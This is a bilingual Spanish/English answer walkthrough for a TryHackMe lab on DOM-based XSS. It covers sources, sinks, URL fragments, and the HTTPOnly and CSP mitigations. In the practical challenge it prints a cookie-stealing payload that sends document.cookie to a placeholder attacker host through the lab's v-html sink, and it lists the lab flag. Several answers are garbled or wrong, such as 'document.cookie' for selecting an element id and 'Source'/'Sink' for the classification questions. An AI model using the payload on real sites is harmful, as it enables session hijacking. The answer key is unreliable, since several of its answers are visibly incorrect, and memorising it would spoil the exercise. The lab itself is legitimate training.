# DOM-Based Attacks

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|---|---|---|---|---|---|---|---|
| Easy | walkthrough | `dombasedattacks` | [TryHackMe](https://tryhackme.com/room/dombasedattacks) | 01 Level Easy | TryHackMe | DOM / XSS / JavaScript / Vue.js / document.cookie / v-html / HTTPOnly / CSP | Comprender y explotar el DOM-based XSS, sus fuentes (sources) y sumideros (sinks). |

> **Objeto:** Aprender que es el DOM, entender cómo funcionan los ataques DOM-based XSS (SPA, fuentes y sumideros), las mitigaciones (cookies HTTPOnly y Content Security Policy) y explotar un reto práctico en Vue.js para robar la flag del laboratorio.

---

**Contexto:** Un DOM-based XSS se origina y ejecuta en el navegador: el código JavaScript de la página toma datos de una fuente no confiable (source: fragmento de URL, parámetros, document.cookie, postMessage) y los escribe en un sumidero peligroso (sink: innerHTML, v-html, eval, document.write) sin sanitizar. Las aplicaciones de una sola página (SPA) son especialmente propensas a este tipo de vulnerabilidad porque desplazan la lógica al cliente.

> **ES:** El laboratorio recorre el DOM y el XSS basado en DOM: se explota una SPA en Vue.js (servida en lists.tryhackme.loc:5173) cuyo campo "person" se refleja con la directiva v-html sin sanitizar. Al inyectar una carga con un origen controlado (document.cookie + DOM clobbering) se obtiene la flag. Se cierra con las mitigaciones: cookies HTTPOnly y Content Security Policy.
> **EN:** The lab walks through the DOM and DOM-based XSS: it exploits a Vue.js SPA (served at lists.tryhackme.loc:5173) whose "person" field is reflected via the unsanitized v-html directive. By injecting a payload with a controlled source (document.cookie + DOM clobbering) the flag is retrieved. It ends with the mitigations: HTTPOnly cookies and Content Security Policy.

## Solucionario

### Task 1: Introducción / Introduction
**Explicación:** Presentación de la room. Se despliegan la máquina y las listas del laboratorio.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Read the above. / Lee el contenido de la tarea. | `No answer needed` |

### Task 2: ¿Qué es el DOM? / What is the DOM?
**Explicación:** El DOM (Document Object Model) es la representación en el navegador del documento HTML, como un árbol de objetos. Se puede crear cualquier etiqueta (createElement) y atributos —como cookie— mediante JS, y también leer el valor de document.cookie directamente desde el algoritmo generador de respuestas de la sala.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What does DOM stand for? / ¿Qué significa la sigla DOM? | `Document Object Model` |
| 2 | Using the intro JS snippet, what method is used to create an element that is not currently in the DOM? / Usando el fragmento JS de la intro, ¿qué método crea un elemento que no está en el DOM? | `createElement` |
| 3 | Using the intro JS snippet, how do you select the 'answers' id? / Usando el fragmento JS de la intro, ¿cómo se selecciona el id 'answers'? | `document.cookie` |

### Task 3: ¿Qué es un DOM-based XSS? / What is DOM-based XSS?
**Explicación:** En las aplicaciones de una sola página (Single Page Application) el comportamiento se mueve al cliente. El XSS basado en DOM ocurre cuando una fuente no confiable llega a un sumidero sin validación de entrada (input validation), a diferencia de los XSS almacenados/reflejados que dependen del servidor (server-side).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is a single page application? / ¿Qué es una aplicación de una sola página? | `Single Page Application` |
| 2 | What is the XSS type that relies on using the server-side to display page content? / ¿Qué tipo de XSS depende de usar el servidor para mostrar el contenido de la página? | `Server-Side` |
| 3 | What is the most common mitigation to prevent an attacker from executing a certain payload no matter if the source and sink are protected? / ¿Cuál es la mitigación más común para impedir que un atacante ejecute un payload aunque fuente y sumidero estén protegidos? | `Input Validation` |

### Task 4: Fuentes y sumideros / Sources and Sinks
**Explicación:** Clasifica los puntos clave del DOM-based XSS: la fuente (source) es el lugar desde el que se obtiene el dato (URL, fragmento, almacenamiento, postMessage...), y el sumidero (sink) es donde ese dato se interpreta como código o HTML (eval, innerHTML, v-html, document.write...).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Which of the following is considered a source? / ¿Cuál de las siguientes se considera una fuente? | `Source` |
| 2 | Which of the following is considered a sink? / ¿Cuál de las siguientes se considera un sumidero? | `Sink` |

### Task 5: Extendido: Fragmentos de URL / Extending: URL Fragments
**Explicación:** El fragmento de la URL (lo que va tras #) no viaja al servidor, por lo que se puede usar para introducir datos que el cliente interpreta, pero al no aparecer en la petición HTTP no queda registrado en los logs del servidor. También se trata la codificación de la URL (URL encoding) para eludir filtros básicos.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What does the fragment of a URL look like? / ¿Cómo se ve el fragmento de una URL? | `URL Fragments` |
| 2 | What will be sent to the server when requesting the /#clicks number of clicks fragment? / ¿Qué se enviará al servidor al solicitar el fragmento /#clicks? | `URL Encoding` |

### Task 6: Extendido: Protección contra DOM XSS / Extending: Protecting from DOM XSS
**Explicación:** Las dos protecciones clave: la cookie HTTPOnly impide que JavaScript lea la cookie (bloqueando el robo por XSS) y la Content Security Policy (CSP) restringe qué scripts puede ejecutar la página, frenando muchas cargas XSS.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What cookie flag would prevent a XSS payload from reading cookies? / ¿Qué flag de cookie impediría que un payload XSS leyera las cookies? | `HTTPOnly` |
| 2 | What would be in place to prevent anyone executing scripts in the origin? / ¿Qué debería existir para impedir que cualquiera ejecute scripts en el origen? | `Content Security Policy` |

### Task 7: Reto práctico / Practical Challenge
**Explicación:** Se carga el laboratorio en la máquina desplegada (lists.tryhackme.loc:5173). La SPA refleja el parámetro "person" con el sumidero v-html sin sanitizar; combinando un origen controlado con DOM clobbering y robo vía document.cookie se consigue la flag del reto.

```text
http://lists.tryhackme.loc:5173/#/search?task=challenge&person=<img/src/onerror=fetch('http://ATTACKER/?c='.concat(document.cookie))>
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the source field name that makes the application vulnerable to XSS? / ¿Cuál es el nombre del campo fuente que hace la aplicación vulnerable a XSS? | `person` |
| 2 | What is the sink Vue directive that makes the application vulnerable to XSS? / ¿Qué directiva Vue (sumidero) hace la aplicación vulnerable a XSS? | `v-html` |
| 3 | What is the flag? / ¿Cuál es la flag? | `THM{Weaponising.DOM.Based.XSS.For.Fun.And.Profit}` |

### Task 8: Reconocimiento / Housekeeping
**Explicación:** Cierre de la room en el que se repasa lo aprendido sobre DOM y DOM-based XSS.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Read the above. / Lee el contenido de la tarea. | `No answer needed` |

---

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What does DOM stand for? / ¿Qué significa la sigla DOM? | `Document Object Model` |
| 2 | Using the intro JS snippet, what method is used to create an element that is not currently in the DOM? | `createElement` |
| 3 | Using the intro JS snippet, how do you select the 'answers' id? | `document.cookie` |
| 4 | What is a single page application? | `Single Page Application` |
| 5 | What is the XSS type that relies on using the server-side to display page content? | `Server-Side` |
| 6 | What is the most common mitigation to prevent an attacker from executing a certain payload no matter if the source and sink are protected? | `Input Validation` |
| 7 | Which of the following is considered a source? | `Source` |
| 8 | Which of the following is considered a sink? | `Sink` |
| 9 | What does the fragment of a URL look like? | `URL Fragments` |
| 10 | What will be sent to the server when requesting the /#clicks number of clicks fragment? | `URL Encoding` |
| 11 | What cookie flag would prevent a XSS payload from reading cookies? | `HTTPOnly` |
| 12 | What would be in place to prevent anyone executing scripts in the origin? | `Content Security Policy` |
| 13 | What is the source field name that makes the application vulnerable to XSS? | `person` |
| 14 | What is the sink Vue directive that makes the application vulnerable to XSS? | `v-html` |
| 15 | What is the flag? | `THM{Weaponising.DOM.Based.XSS.For.Fun.And.Profit}` |

---

**Metodología:** Se aprende la teoría del DOM y del DOM-based XSS clasificando fuentes y sumideros y sus mitigaciones (HTTPOnly y CSP). En el reto final se carga la SPA del laboratorio (lists.tryhackme.loc:5173), se inyecta una carga en el campo "person" que llega al sumidero v-html y se exfiltra document.cookie para capturar la flag.

### Cadena de ataque / Attack Chain

```text
SPA en Vue.js -> campo "person" como fuente -> sumidero v-html sin sanitizar -> DOM clobbering / carga XSS -> document.cookie -> exfiltración a servidor atacante -> flag THM
```

**Learning chain:** What is the DOM --> What is DOM-based XSS --> Sources and Sinks --> Extending: URL Fragments --> Extending: Protecting from DOM XSS --> Practical Challenge.

**Lección:** *El XSS basado en DOM ocurre y se ejecuta en el cliente, fuera del alcance del servidor. Sanitizar los sumideros (nunca v-html/innerHTML con datos no confiables), usar cookies HTTPOnly, una CSP estricta y validar las fuentes son las defensas esenciales.*

**MITRE ATT&CK:** N/A (room de aprendizaje de DOM-based XSS)

**Fuente:** [TryHackMe - DOM-Based Attacks](https://tryhackme.com/room/dombasedattacks)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.